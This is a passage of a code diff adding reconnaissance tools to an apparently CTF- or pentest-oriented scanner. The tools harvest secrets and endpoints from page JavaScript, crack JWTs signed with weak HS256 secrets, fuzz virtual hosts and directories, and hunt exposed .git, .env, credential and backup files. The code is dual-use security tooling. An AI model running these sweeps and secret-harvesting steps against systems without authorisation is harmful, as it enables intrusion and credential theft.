+    name = (fetch_services(ip).get((port, proto)) or (None,))[0] or ""
+    tls = port in (443, 8443) or "https" in name.lower() or "ssl" in name.lower()
+    base = f"{'https' if tls else 'http'}://{ip}:{port}"
+    ctx = ssl._create_unverified_context()
+    opener = urllib.request.build_opener(urllib.request.HTTPSHandler(context=ctx))
+
+    def _get(url: str, limit: int = 512_000) -> str:
+        req = urllib.request.Request(url, headers={"User-Agent": "pshunter"})
+        try:
+            with opener.open(req, timeout=8) as r:            # default opener follows redirects
+                return r.read(limit).decode("utf-8", "replace")
+        except urllib.error.HTTPError as e:                   # 4xx/5xx bodies still worth mining
+            return e.read(limit).decode("utf-8", "replace") if e.fp else ""
+
+    html = _get(base + "/")
+    if not html:
+        raise RuntimeError(f"no HTML from {base}/ (unreachable?)")
+
+    js_urls = []                                              # same host:port JS only, cap 10
+    for src in re.findall(r"<script[^>]+src=[\"']([^\"']+)[\"']", html, re.I):
+        u = urllib.parse.urljoin(base + "/", src)
+        if u.startswith(base) and u not in js_urls:
+            js_urls.append(u)
+    js_urls = js_urls[:10]
+
+    corpus = html
+    for u in js_urls:
+        corpus += "\n" + _get(u)
+
+    comments = []
+    for c in re.findall(r"<!--(.*?)-->", html, re.S):
+        c = " ".join(c.split())
+        if len(c) > 3 and not c.startswith("[if"):            # skip IE conditional comments
+            comments.append(c[:160])
+
+    eps = set()
+    eps.update(re.findall(r"[\"'`](/[A-Za-z0-9_./?=&%-]{2,})[\"'`]", corpus))
+    eps.update(re.findall(r"(?:fetch|axios(?:\.\w+)?|\.open)\(\s*[\"'`]([^\"'`]+)", corpus))
+    eps.update(re.findall(r"(https?://[A-Za-z0-9_.:-]+/[A-Za-z0-9_./?=&%-]*)", corpus))
+    endpoints = sorted({e for e in eps if len(e) <= 120})[:40]
+
+    secrets, seen = [], set()
+    for label, pat in _SECRET_PATTERNS:
+        for mtch in re.findall(pat, corpus):
+            s = (mtch if isinstance(mtch, str) else mtch[0]).strip()[:80]
+            if (label, s) not in seen:
+                seen.add((label, s))
+                secrets.append(f"{label}: {s}")
+    secrets = secrets[:15]
+
+    lines = [f"{base}/ → {len(html)} bytes HTML, {len(js_urls)} JS file(s)"]
+    if js_urls:
+        lines.append(f"\nJS FILES ({len(js_urls)}):")
+        lines += [f"  {u}" for u in js_urls]
+    if endpoints:
+        lines.append(f"\nENDPOINTS ({len(endpoints)}):")
+        lines += [f"  {e}" for e in endpoints]
+    if comments:
+        lines.append(f"\nHTML COMMENTS ({len(comments)}):")
+        lines += [f"  {c}" for c in comments[:25]]
+    if secrets:
+        lines.append(f"\nPOTENTIAL SECRETS ({len(secrets)}):")
+        lines += [f"  {s}" for s in secrets]
+    return "\n".join(lines)
+
+
+_ERROR_TECH = [   # framework signatures that leak from an error/404 page body
+    ("Werkzeug/Flask", r"Werkzeug|Traceback \(most recent call last\)"),
+    ("Django",         r"Django|You're seeing this error because"),
+    ("Laravel/Symfony", r"Laravel|Symfony|Whoops"),
+    ("ASP.NET",        r"ASP\.NET|Server Error in .*? Application"),
+    ("Java/Tomcat",    r"Apache Tomcat|javax\.servlet|java\.lang\."),
+    ("Express",        r"Cannot (?:GET|POST) /|X-Powered-By: Express"),
+    ("Rails",          r"Ruby on Rails|Action Controller"),
+    ("PHP",            r"Fatal error:|Warning:.*?on line|<b>Notice</b>"),
+]
+
+
+def _tool_http_wellknown(ip: str, port: int, proto: str) -> str:
+    """HTTP step-6 tool: fetch a fixed set of well-known files (robots.txt, sitemap.xml,
+    .well-known, an error page) and pull out hidden paths + tech leaks. Stdlib only; a dead
+    target raises. Not a brute-force — a known, finite set of locations (dir-brute is step 8)."""
+    import urllib.request
+    import urllib.error
+    import ssl
+
+    name = (fetch_services(ip).get((port, proto)) or (None,))[0] or ""
+    tls = port in (443, 8443) or "https" in name.lower() or "ssl" in name.lower()
+    base = f"{'https' if tls else 'http'}://{ip}:{port}"
+    ctx = ssl._create_unverified_context()
+    opener = urllib.request.build_opener(urllib.request.HTTPSHandler(context=ctx))
+
+    def _get(path: str, limit: int = 256_000):
+        req = urllib.request.Request(base + path, headers={"User-Agent": "pshunter"})
+        try:
+            with opener.open(req, timeout=8) as r:
+                return r.status, r.read(limit).decode("utf-8", "replace")
+        except urllib.error.HTTPError as e:
+            return e.code, (e.read(limit).decode("utf-8", "replace") if e.fp else "")
+        except Exception:                                     # connection-level failure
+            return None, ""
+
+    robots_status, robots = _get("/robots.txt")
+    err_status, err = _get("/pshunter-probe-404-xyz")         # error page for a tech leak
+    if robots_status is None and err_status is None:
+        raise RuntimeError(f"{base} unreachable")
+
+    robots_paths = []
+    if robots_status == 200:
+        for p in re.findall(r"(?im)^(?:Disallow|Allow):\s*(\S+)", robots):
+            if p not in robots_paths:
+                robots_paths.append(p)
+
+    sitemap_urls = []
+    for sm in ("/sitemap.xml", "/sitemap_index.xml"):
+        st, body = _get(sm)
+        if st == 200:
+            for loc in re.findall(r"<loc>\s*([^<\s]+)\s*</loc>", body, re.I):
+                if loc not in sitemap_urls:
+                    sitemap_urls.append(loc)
+    sitemap_urls = sitemap_urls[:100]
+
+    wellknown = []
+    for wk in ("/.well-known/security.txt", "/crossdomain.xml", "/clientaccesspolicy.xml"):
+        st, body = _get(wk)
+        if st == 200 and body.strip():
+            wellknown.append((wk, body.strip()[:400]))
+
+    tech = [label for label, pat in _ERROR_TECH if re.search(pat, err, re.I | re.S)]
+
+    lines = [f"{base} — well-known probe (robots {robots_status}, error {err_status})"]
+    if robots_paths:
+        lines.append(f"\nROBOTS PATHS ({len(robots_paths)}):")
+        lines += [f"  {p}" for p in robots_paths[:50]]
+    if sitemap_urls:
+        lines.append(f"\nSITEMAP URLS ({len(sitemap_urls)}):")
+        lines += [f"  {u}" for u in sitemap_urls]
+    if wellknown:
+        lines.append(f"\nWELL-KNOWN ({len(wellknown)}):")
+        for path, body in wellknown:
+            lines.append(f"  {path}:")
+            lines += [f"    {ln.rstrip()}" for ln in body.splitlines()[:8]]
+    if tech:
+        lines.append(f"\nERROR-PAGE TECH: {', '.join(tech)}")
+    return "\n".join(lines)
+
+
+_JWT_WEAK_SECRETS = [   # small curated list — a trivial-secret check, not a full crack (hashcat)
+    "secret", "password", "changeme", "admin", "jwt", "key", "private", "your-256-bit-secret",
+    "your_jwt_secret", "supersecret", "s3cr3t", "secretkey", "secret123", "password123",
+    "12345678", "qwerty", "test", "dev", "default", "token", "mysecret", "jwtsecret",
+    "jsonwebtoken", "shhhh", "topsecret", "letmein", "root", "pass", "hmac", "signature",
+    "verysecret", "sign", "secretpassword", "iloveyou", "abc123", "welcome", "ChangeMe!",
+]
+
+
+def _jwt_analyze(token: str):
+    """(header, payload, note) for a JWT, or None if it isn't one. `note` flags alg:none or a
+    cracked weak HS256 secret."""
+    import base64
+    import json
+    import hmac
+    import hashlib
+
+    parts = token.split(".")
+    if len(parts) != 3 or not token.startswith("eyJ"):
+        return None
+
+    def _seg(s):
+        return json.loads(base64.urlsafe_b64decode(s + "=" * (-len(s) % 4)).decode("utf-8", "replace"))
+
+    try:
+        header, payload = _seg(parts[0]), _seg(parts[1])
+    except Exception:
+        return None
+    alg, note = str(header.get("alg", "?")), None
+    if alg.lower() == "none":
+        note = "alg:none → auth bypass"
+    elif alg.upper() == "HS256":
+        signing_input = f"{parts[0]}.{parts[1]}".encode()
+        for sec in _JWT_WEAK_SECRETS:
+            sig = base64.urlsafe_b64encode(
+                hmac.new(sec.encode(), signing_input, hashlib.sha256).digest()).rstrip(b"=").decode()
+            if hmac.compare_digest(sig, parts[2]):
+                note = f"weak HS256 secret: '{sec}'"
+                break
+    return header, payload, note
+
+
+def _tool_http_cookies(ip: str, port: int, proto: str) -> str:
+    """HTTP step-7 tool: read Set-Cookie flags, flag predictable session IDs, and decode any
+    JWT (alg:none / weak HS256 secret). Stdlib only; a dead target raises. No cookies is a
+    valid green result (nothing to report)."""
+    import urllib.request
+    import urllib.error
+    import ssl
+
+    name = (fetch_services(ip).get((port, proto)) or (None,))[0] or ""
+    tls = port in (443, 8443) or "https" in name.lower() or "ssl" in name.lower()
+    base = f"{'https' if tls else 'http'}://{ip}:{port}"
+    ctx = ssl._create_unverified_context()
+    opener = urllib.request.build_opener(urllib.request.HTTPSHandler(context=ctx))
+    req = urllib.request.Request(base + "/", headers={"User-Agent": "pshunter"})
+    try:
+        resp = opener.open(req, timeout=8)
+        headers = resp.headers
+    except urllib.error.HTTPError as e:                        # 4xx/5xx still carry Set-Cookie
+        headers = e.headers
+
+    raw = headers.get_all("Set-Cookie") or []
+    cookie_lines, jwt_lines = [], []
+    for sc in raw:
+        cname, _, cval = sc.split(";")[0].partition("=")
+        cname, cval = cname.strip(), cval.strip()
+        attrs = sc.lower()
+        missing = [f for f, tok in (("HttpOnly", "httponly"), ("Secure", "secure"),
+                                    ("SameSite", "samesite"))
+                   if tok not in attrs and not (f == "Secure" and not tls)]
+        line = f"{cname}: " + (f"missing {','.join(missing)}" if missing else "flags ok")
+        if re.search(r"sess|sid|token|auth|jwt|id$", cname, re.I) and \
+                (len(cval) < 8 or cval.isdigit() or len(set(cval)) <= 4):
+            line += " · looks predictable"
+        cookie_lines.append(line)
+        info = _jwt_analyze(cval)
+        if info:
+            hdr, payload, note = info
+            claims = {k: payload[k] for k in ("sub", "role", "user", "name", "exp") if k in payload}
+            jwt_lines.append(f"{cname}: alg={hdr.get('alg')} {claims}" + (f"  ⚠ {note}" if note else ""))
+
+    lines = [f"{base}/ — {len(raw)} Set-Cookie header(s)"]
+    if cookie_lines:
+        lines.append("\nCOOKIES:")
+        lines += [f"  {c}" for c in cookie_lines]
+    if jwt_lines:
+        lines.append("\nJWT:")
+        lines += [f"  {j}" for j in jwt_lines]
+    if not cookie_lines:
+        lines.append("\nno cookies set (pre-auth)")
+    return "\n".join(lines)
+
+
+# vhost/subdomain wordlists, best first — the runner uses the first that exists on disk,
+# else a small builtin fallback so the tool always has something to sweep.
+_VHOST_WORDLISTS = [
+    ("seclists top-20000",     "/usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt"),
+    ("seclists top-5000",      "/usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt"),
+    ("seclists bitquark-100k", "/usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt"),
+    ("seclists n0kovo-small",  "/usr/share/seclists/Discovery/DNS/n0kovo_subdomains/n0kovo_subdomains_small.txt"),
+    ("amass top-20000",        "/usr/share/wordlists/amass/subdomains-top1mil-20000.txt"),
+    ("amass top-5000",         "/usr/share/wordlists/amass/subdomains-top1mil-5000.txt"),
+    ("dnsmap",                 "/usr/share/wordlists/dnsmap.txt"),
+]
+_VHOST_BUILTIN = [   # ultimate fallback: common internal / CTF vhost labels
+    "www", "dev", "development", "staging", "stage", "test", "testing", "uat", "qa",
+    "admin", "administrator", "api", "api-dev", "internal", "intranet", "corp", "portal",
+    "dashboard", "app", "apps", "web", "webmail", "mail", "smtp", "vpn", "git", "gitlab",
+    "jenkins", "jira", "confluence", "grafana", "kibana", "prometheus", "db", "database",
+    "phpmyadmin", "backup", "old", "beta", "demo", "static", "cdn", "files", "upload",
+    "storage", "auth", "sso", "login", "secure", "monitor", "status", "support",
+]
+_VHOST_DEADLINE = 600         # s — hard wall-clock cap across every pass
+_VHOST_THREADS = 30
+_VHOST_REQ_TIMEOUT = 5
+_VHOST_MAX_CANDIDATES = 25000  # sanity cap on words per pass
+
+
+def _pick_vhost_wordlist() -> tuple:
+    """Return (label, words) from the best available wordlist, or a builtin fallback.
+    `label` names the source (with its path) so it can be shown at launch."""
+    for label, path in _VHOST_WORDLISTS:
+        if os.path.exists(path):
+            try:
+                with open(path, encoding="utf-8", errors="ignore") as fh:
+                    words = [w.strip() for w in fh if w.strip() and not w.startswith("#")]
+            except OSError:
+                continue
+            if words:
+                return f"{label} ({path})", words
+    return f"builtin ({len(_VHOST_BUILTIN)} common vhosts)", list(_VHOST_BUILTIN)
+
+
+def _vhost_base_domains(ip: str) -> list:
+    """Base domains to fuzz as FUZZ.<domain>, derived from hostnames already harvested
+    (cert SAN/CN, redirects, JS). Heuristic registrable domain = last 2–3 labels."""
+    doms = set()
+    for hn, _p, _s in fetch_hostnames(ip):
+        hn = (hn or "").lstrip("*.").strip(".")
+        parts = hn.split(".")
+        if len(parts) >= 2:
+            doms.add(".".join(parts[-2:]))
+        if len(parts) >= 3:
+            doms.add(".".join(parts[-3:]))
+    return sorted(doms)
+
+
+def _tool_vhost_fuzz(ip: str, port: int, proto: str) -> str:
+    """HTTP step-8 tool: sweep virtual hosts on THIS IP by spoofing the Host header, keeping
+    only responses that differ from a per-pass catch-all baseline (kills wildcard vhosts).
+    Runs one pass per harvested base domain (FUZZ.<domain>) plus a bare-label pass, all under
+    a shared wall-clock deadline. Discovered FQDN vhosts are saved to the hostnames table
+    incrementally (the moment each is found), so a long run never loses progress."""
+    import http.client
+    import ssl
+    import time
+    import random
+    import string
+    import threading
+    import queue as _queue
+
+    name = (fetch_services(ip).get((port, proto)) or (None,))[0] or ""
+    tls = port in (443, 8443) or "https" in name.lower() or "ssl" in name.lower()
+    scheme = "https" if tls else "http"
+    ctx = ssl._create_unverified_context()
+
+    def _probe(hostval):
+        """(status, body-length) for a GET / with a spoofed Host, or (None, None) on error."""
+        conn = None
+        try:
+            if tls:
+                conn = http.client.HTTPSConnection(ip, port, timeout=_VHOST_REQ_TIMEOUT, context=ctx)
+            else:
+                conn = http.client.HTTPConnection(ip, port, timeout=_VHOST_REQ_TIMEOUT)
+            conn.request("GET", "/", headers={"Host": hostval, "User-Agent": "pshunter"})
+            resp = conn.getresponse()
+            body = resp.read(65536)
+            return resp.status, len(body)
+        except Exception:                                     # noqa: BLE001 — one dead probe never aborts the sweep
+            return None, None
+        finally:
+            if conn is not None:
+                try:
+                    conn.close()
+                except Exception:                             # noqa: BLE001
+                    pass
+
+    # fail fast if the web server itself is unreachable (so the step won't go green on nothing)
+    if _probe(ip)[0] is None:
+        raise RuntimeError(f"{scheme}://{ip}:{port}/ unreachable — cannot vhost-fuzz")
+
+    wl_label, words = _pick_vhost_wordlist()
+    words = words[:_VHOST_MAX_CANDIDATES]
+    domains = _vhost_base_domains(ip)
+
+    # passes: one per base domain (FUZZ.domain), then a bare-label pass last (lower priority)
+    passes = [(f"FUZZ.{d}", (lambda w, d=d: f"{w}.{d}")) for d in domains]
+    passes.append(("FUZZ (bare label)", (lambda w: w)))
+
+    deadline = time.time() + _VHOST_DEADLINE
+    hits, seen = [], set()
+    hits_lock = threading.Lock()
+    tested = [0]
+    tested_lock = threading.Lock()
+    stopped_deadline = [False]
+
+    def _diff(status, length, b_status, b_len):
+        if status is None:
+            return False
+        if b_status is None:                                  # junk host got nothing → any live vhost counts
+            return True
+        if status != b_status:
+            return True
+        return abs(length - b_len) > max(200, int(b_len * 0.05))
+
+    pass_summaries = []
+    for pass_label, hostfmt in passes:
+        if time.time() >= deadline:
+            stopped_deadline[0] = True
+            break
+        rnd = "zz" + "".join(random.choices(string.ascii_lowercase + string.digits, k=10))
+        b_status, b_len = _probe(hostfmt(rnd))               # per-pass catch-all baseline
+        q = _queue.Queue()
+        for w in words:
+            q.put(w)
+
+        def _worker():
+            while True:
+                if time.time() >= deadline:
+                    stopped_deadline[0] = True
+                    return
+                try:
+                    w = q.get_nowait()
+                except _queue.Empty:
+                    return
+                hostval = hostfmt(w)
+                status, length = _probe(hostval)
+                with tested_lock:
+                    tested[0] += 1
+                if _diff(status, length, b_status, b_len):
+                    with hits_lock:
+                        if hostval not in seen:
+                            seen.add(hostval)
+                            hits.append(f"+ {hostval}  → HTTP {status}  ({length} b)")
+                            # persist FQDN vhosts live so a long run never loses progress
+                            save_hostnames(ip, [{"port": port, "hostname": hostval,
+                                                 "source": "vhost-fuzz"}])
+
+        threads = [threading.Thread(target=_worker, daemon=True) for _ in range(_VHOST_THREADS)]
+        for t in threads:
+            t.start()
+        for t in threads:
+            t.join()
+        base_desc = f"HTTP {b_status} ({b_len} b)" if b_status is not None else "no response"
+        pass_summaries.append(f"  {pass_label}: baseline {base_desc}")
+
+    reason = "deadline" if stopped_deadline[0] else "wordlist exhausted"
+    lines = [f"{scheme}://{ip}:{port}/ vhost sweep",
+             f"wordlist: {wl_label}",
+             f"passes: {len(passes)} ({', '.join(pl for pl, _ in passes)})",
+             f"tested {tested[0]} · hits {len(hits)} · stopped: {reason}",
+             ""]
+    lines += pass_summaries
+    if hits:
+        lines.append("\nVHOSTS:")
+        lines += [f"  {h}" for h in sorted(hits)]
+    else:
+        lines.append("\nno differentiated vhosts found")
+    return "\n".join(lines)
+
+
+# directory/file wordlists for content discovery, best first — each entry may list several
+# files (merged if present); the runner uses the first entry that has any file on disk.
+_DIRB_WORDLISTS = [
+    ("seclists raft-medium", ["/usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt",
+                              "/usr/share/seclists/Discovery/Web-Content/raft-medium-files.txt"]),
+    ("seclists dirlist-2.3-medium", ["/usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt"]),
+    ("seclists common", ["/usr/share/seclists/Discovery/Web-Content/common.txt"]),
+    ("dirb common", ["/usr/share/wordlists/dirb/common.txt"]),
+    ("dirb big", ["/usr/share/wordlists/dirb/big.txt"]),
+    ("dirbuster small", ["/usr/share/wordlists/dirbuster/directory-list-2.3-small.txt"]),
+]
+_DIRB_BUILTIN = [   # ultimate fallback: common dirs / files worth a look
+    "admin", "administrator", "login", "dashboard", "api", "uploads", "upload", "images",
+    "assets", "static", "backup", "backups", "config", "includes", "inc", "tmp", "test",
+    "dev", "old", "private", "secret", "data", "db", "sql", "logs", "log", "wp-admin",
+    "wp-content", "phpmyadmin", "server-status", "robots.txt", "sitemap.xml", ".git",
+    ".env", ".htaccess", "web.config", "config.php", "info.php", "phpinfo.php", "index.php",
+]
+_DIRB_EXTS = ["php", "asp", "aspx", "txt", "bak", "zip", "html", "old"]
+_DIRB_DEADLINE = 900          # s — hard wall-clock cap across all targets
+_DIRB_THREADS = 30
+_DIRB_REQ_TIMEOUT = 5
+_DIRB_MAX_WORDS = 20000       # sanity cap on words per target
+_DIRB_SENSITIVE = re.compile(
+    r"\.(bak|zip|old|sql|tar|gz|tgz|env|git|svn|conf|config|pem|key)\b"
+    r"|/(backup|admin|config|\.git|\.env|\.svn)", re.I)
+
+
+def _pick_dirb_wordlist() -> tuple:
+    """Return (label, words) from the best available dir/file wordlist, or a builtin
+    fallback. Multi-file entries are merged (dedup, order-preserving)."""
+    for label, paths in _DIRB_WORDLISTS:
+        merged, seen = [], set()
+        for path in paths:
+            if not os.path.exists(path):
+                continue
+            try:
+                with open(path, encoding="utf-8", errors="ignore") as fh:
+                    for ln in fh:
+                        w = ln.strip()
+                        if w and not w.startswith("#") and w not in seen:
+                            seen.add(w)
+                            merged.append(w)
+            except OSError:
+                continue
+        if merged:
+            return f"{label} ({', '.join(paths)})", merged
+    return f"builtin ({len(_DIRB_BUILTIN)} common paths)", list(_DIRB_BUILTIN)
+
+
+def _tool_dir_brute(ip: str, port: int, proto: str) -> str:
+    """HTTP step-9 tool: content discovery — brute-force dirs/files on the default host AND
+    every discovered vhost (Host header, so vhosts work without /etc/hosts). Per target a
+    soft-404 baseline filters catch-all 200s; only responses that differ are reported. All
+    targets share one wall-clock deadline. Stdlib only; a dead server raises."""
+    import http.client
+    import ssl
+    import time
+    import random
+    import string
+    import threading
+    import queue as _queue
+
+    name = (fetch_services(ip).get((port, proto)) or (None,))[0] or ""
+    tls = port in (443, 8443) or "https" in name.lower() or "ssl" in name.lower()
+    scheme = "https" if tls else "http"
+    ctx = ssl._create_unverified_context()
+
+    def _probe(hostval, path):
+        conn = None
+        try:
+            if tls:
+                conn = http.client.HTTPSConnection(ip, port, timeout=_DIRB_REQ_TIMEOUT, context=ctx)
+            else:
+                conn = http.client.HTTPConnection(ip, port, timeout=_DIRB_REQ_TIMEOUT)
+            conn.request("GET", path, headers={"Host": hostval, "User-Agent": "pshunter"})
+            resp = conn.getresponse()
+            body = resp.read(65536)
+            return resp.status, len(body)
+        except Exception:                                     # noqa: BLE001
+            return None, None
+        finally:
+            if conn is not None:
+                try:
+                    conn.close()
+                except Exception:                             # noqa: BLE001
+                    pass
+
+    if _probe(ip, "/")[0] is None:
+        raise RuntimeError(f"{scheme}://{ip}:{port}/ unreachable — cannot content-sweep")
+
+    wl_label, words = _pick_dirb_wordlist()
+    words = words[:_DIRB_MAX_WORDS]
+
+    def _paths_for(word):
+        w = word.lstrip("/")
+        if not w:
+            return []
+        out = ["/" + w]
+        if "." not in w:                                      # plain dir/name → try extensions too
+            out += [f"/{w}.{e}" for e in _DIRB_EXTS]
+        return out
+
+    vhosts = sorted({hn for hn, _p, _s in fetch_hostnames(ip)})
+    targets = [ip] + [v for v in vhosts if v != ip]          # default host first, then each vhost
+
+    deadline = time.time() + _DIRB_DEADLINE
+    tested = [0]
+    tested_lock = threading.Lock()
+    stopped_deadline = [False]
+    target_hits = {}                                          # hostval -> ["+ 200  /path", ...]
+
+    def _rnd_path():
+        return "/zz" + "".join(random.choices(string.ascii_lowercase + string.digits, k=12)) \
+               + random.choice(["", ".php"])
+
+    def _is_hit(status, length, baselines):
+        if status is None or status == 404:
+            return False
+        for bs, bl in baselines:
+            if bs is not None and status == bs and abs(length - bl) <= max(200, int(bl * 0.05)):
+                return False                                  # matches the soft-404 signature
+        return True
+
+    for hostval in targets:
+        if time.time() >= deadline:
+            stopped_deadline[0] = True
+            break
+        baselines = [_probe(hostval, _rnd_path()) for _ in range(2)]
+        q = _queue.Queue()
+        for w in words:
+            for p in _paths_for(w):
+                q.put(p)
+        hits, seen = [], set()
+        hits_lock = threading.Lock()
+
+        def _worker():
+            while True:
+                if time.time() >= deadline:
+                    stopped_deadline[0] = True
+                    return
+                try:
+                    path = q.get_nowait()
+                except _queue.Empty:
+                    return
+                status, length = _probe(hostval, path)
+                with tested_lock:
+                    tested[0] += 1
+                if _is_hit(status, length, baselines):
+                    with hits_lock:
+                        if path not in seen:
+                            seen.add(path)
+                            hits.append(f"+ {status}  {path}")
+                q.task_done()
+
+        threads = [threading.Thread(target=_worker, daemon=True) for _ in range(_DIRB_THREADS)]
+        for t in threads:
+            t.start()
+        for t in threads:
+            t.join()
+        if hits:
+            target_hits[hostval] = sorted(hits, key=lambda h: h.split()[-1])
+
+    total_hits = sum(len(v) for v in target_hits.values())
+    reason = "deadline" if stopped_deadline[0] else "wordlist exhausted"
+    lines = [f"{scheme}://{ip}:{port}/ content sweep",
+             f"wordlist: {wl_label}",
+             f"targets: {len(targets)} ({', '.join([f'{ip} [default]'] + [v for v in targets if v != ip])})",
+             f"tested {tested[0]} · hits {total_hits} · stopped: {reason}"]
+    if target_hits:
+        for hostval in targets:
+            hh = target_hits.get(hostval)
+            if not hh:
+                continue
+            lines.append(f"\n[{hostval}{' [default]' if hostval == ip else ''}]")
+            lines += [f"  {h}" for h in hh]
+    else:
+        lines.append("\nno content discovered (soft-404 only)")
+    return "\n".join(lines)
+
+
+# known high-value exposures: (path, body-signature | None, high-severity?). The signature
+# (bytes regex, matched against the response body) confirms a true positive with near-zero
+# false positives — a soft-404 200 won't carry `[core]`, `PK\x03\x04`, `ref:`, etc.
+_VCS_CHECKS = [
+    (".git/HEAD", rb"ref:\s", True),
+    (".git/config", rb"\[core\]", True),
+    (".git/index", rb"^DIRC", True),
+    (".git/logs/HEAD", rb"[0-9a-f]{40}", True),
+    (".gitignore", None, False),
+    (".svn/entries", None, True),
+    (".svn/wc.db", rb"^SQLite format 3", True),
+    (".hg/requires", None, True),
+    (".bzr/branch-format", None, True),
+    (".env", rb"[A-Z0-9_]{2,}=", True),
+    (".env.bak", rb"[A-Z0-9_]{2,}=", True),
+    (".env.example", rb"[A-Z0-9_]{2,}=", False),
+    ("web.config", rb"(?i)<configuration", True),
+    ("wp-config.php.bak", rb"(?i)db_password|<\?php", True),
+    ("wp-config.php~", rb"(?i)db_password|<\?php", True),
+    (".htpasswd", rb":\$", True),
+    ("docker-compose.yml", rb"(?i)services:|version:", True),
+    ("Dockerfile", rb"(?i)^FROM\s", False),
+    ("application.properties", rb"(?i)password|url=", True),
+    ("settings.py", rb"(?i)SECRET_KEY|DATABASES", True),
+    ("backup.zip", rb"^PK\x03\x04", True),
+    ("backup.tar.gz", rb"^\x1f\x8b", True),
+    ("backup.sql", rb"(?i)insert into|create table|mysql dump", True),
+    ("dump.sql", rb"(?i)insert into|create table", True),
+    ("db.sql", rb"(?i)insert into|create table", True),
+    ("database.sql", rb"(?i)insert into|create table", True),
+    (".DS_Store", rb"Bud1", False),
+]
+# swap/backup copies of source files leak the source itself (creds, logic) → high
+_VCS_SWAP_BASES = ["index.php", "config.php", "wp-config.php", "configuration.php",
+                   "database.php", "settings.py", "app.py", ".env"]
+_VCS_SWAP_FORMS = ["{b}.bak", "{b}~", "{b}.old", "{b}.save", "{b}.swp", ".{b}.swp", "{b}.orig"]
+# archives named after the site, confirmed by their magic bytes where possible
+_VCS_ARCH_EXTS = ["zip", "tar.gz", "tgz", "tar", "rar", "7z", "sql", "bak"]
+_VCS_ARCH_SIG = {"zip": rb"^PK\x03\x04", "tar.gz": rb"^\x1f\x8b", "tgz": rb"^\x1f\x8b",
+                 "tar": None, "rar": rb"^Rar!", "7z": rb"^7z\xbc\xaf",
+                 "sql": rb"(?i)insert into|create table", "bak": None}
+_VCS_HIGH_RE = re.compile(
+    r"\.git|\.svn|\.hg|\.bzr|\.env|\.htpasswd|wp-config|web\.config|"
+    r"\.sql$|\.(zip|tar\.gz|tgz|tar|rar|7z)$|"
+    r"(\.php|\.py)(~|\.(bak|old|save|orig|swp))$|\.swp$", re.I)
+_VCS_DEADLINE = 180
+_VCS_THREADS = 20
+_VCS_REQ_TIMEOUT = 5
+
+
+def _vcs_derived(hostval: str) -> list:
+    """(path, signature, high) probes derived from the target: source swap/bak files and
+    archives named after the host's labels. Source swaps get a content signature (a leaked
+    copy carries the source itself — <?php / python / KEY=), so they're confirmed with
+    near-zero false positives instead of a fragile length diff."""
+    cands = []
+    for b in _VCS_SWAP_BASES:
+        if b.endswith(".php"):
+            sig, hi = rb"(?i)<\?php|<\?=", True
+        elif b.endswith(".py"):
+            sig, hi = rb"(?i)\b(import |from |def |class |SECRET_KEY|flask|django)\b", True
+        elif b == ".env":
+            sig, hi = rb"[A-Z0-9_]{2,}=", True
+        else:
+            sig, hi = None, False
+        for form in _VCS_SWAP_FORMS:
+            cands.append((form.format(b=b), sig, hi))
+    parts = hostval.split(".")
+    label = parts[0]
+    apex = parts[-2] if len(parts) >= 2 and not hostval.replace(".", "").isdigit() else None
+    bases = {label, apex, "backup", "www", "site", "web", "public_html"} - {None, ""}
+    for base in sorted(bases):
+        for ext in _VCS_ARCH_EXTS:
+            cands.append((f"{base}.{ext}", _VCS_ARCH_SIG.get(ext), True))
+    return cands
+
+
+def _tool_vcs_hunt(ip: str, port: int, proto: str) -> str:
+    """HTTP step-10 tool: hunt exposed VCS dirs, backups and config/secret files on the
+    default host AND every discovered vhost (Host header, no /etc/hosts needed). Each hit is
+    confirmed by a body signature where possible (magic bytes / content pattern) so a
+    catch-all 200 can't cause a false positive. Stdlib only; a dead server raises."""
+    import http.client
+    import ssl
+    import time
+    import random
+    import string
+    import threading
+    import queue as _queue
+
+    name = (fetch_services(ip).get((port, proto)) or (None,))[0] or ""
+    tls = port in (443, 8443) or "https" in name.lower() or "ssl" in name.lower()
+    scheme = "https" if tls else "http"
+    ctx = ssl._create_unverified_context()
+
+    def _probe(hostval, path):
+        conn = None
+        try:
+            if tls:
+                conn = http.client.HTTPSConnection(ip, port, timeout=_VCS_REQ_TIMEOUT, context=ctx)
+            else:
+                conn = http.client.HTTPConnection(ip, port, timeout=_VCS_REQ_TIMEOUT)
+            conn.request("GET", path, headers={"Host": hostval, "User-Agent": "pshunter"})
+            resp = conn.getresponse()
+            return resp.status, resp.read(8192)
+        except Exception:                                     # noqa: BLE001
+            return None, None
+        finally:
+            if conn is not None:
+                try:
+                    conn.close()
+                except Exception:                             # noqa: BLE001
+                    pass
+
+    if _probe(ip, "/")[0] is None:
+        raise RuntimeError(f"{scheme}://{ip}:{port}/ unreachable — cannot hunt exposures")
+
+    vhosts = sorted({hn for hn, _p, _s in fetch_hostnames(ip)})
+    targets = [ip] + [v for v in vhosts if v != ip]
+
+    deadline = time.time() + _VCS_DEADLINE
+    tested = [0]
+    tested_lock = threading.Lock()
+    stopped_deadline = [False]
+    target_hits = {}
+
+    def _rnd_path():
+        return "/zz" + "".join(random.choices(string.ascii_lowercase + string.digits, k=12))
+
+    def _soft404_match(status, blen, baselines):
+        for bs, bl in baselines:
+            if bs is not None and status == bs and abs(blen - bl) <= max(200, int(bl * 0.05)):
+                return True
+        return False
+
+    for hostval in targets:
+        if time.time() >= deadline:
+            stopped_deadline[0] = True
+            break
+        baselines = []
+        for _ in range(2):
+            bs, bb = _probe(hostval, _rnd_path())
+            baselines.append((bs, len(bb or b"")))
+        candidates = [(f"/{p}", sig, hi) for p, sig, hi in _VCS_CHECKS] + \
+                     [(f"/{p}", sig, hi) for p, sig, hi in _vcs_derived(hostval)]
+        q = _queue.Queue()
+        for c in candidates:
+            q.put(c)
+        hits, seen = [], set()
+        hits_lock = threading.Lock()
+
+        def _worker():
+            while True:
+                if time.time() >= deadline:
+                    stopped_deadline[0] = True
+                    return
+                try:
+                    path, sig, _hi = q.get_nowait()
+                except _queue.Empty:
+                    return
+                status, body = _probe(hostval, path)
+                with tested_lock:
+                    tested[0] += 1
+                ok, strong = False, False
+                if status is not None and status != 404:
+                    if sig is not None:
+                        if re.search(sig, body or b""):
+                            ok, strong = True, True          # signature confirms → certain
+                    elif status in (200, 301, 302, 401, 403) and \
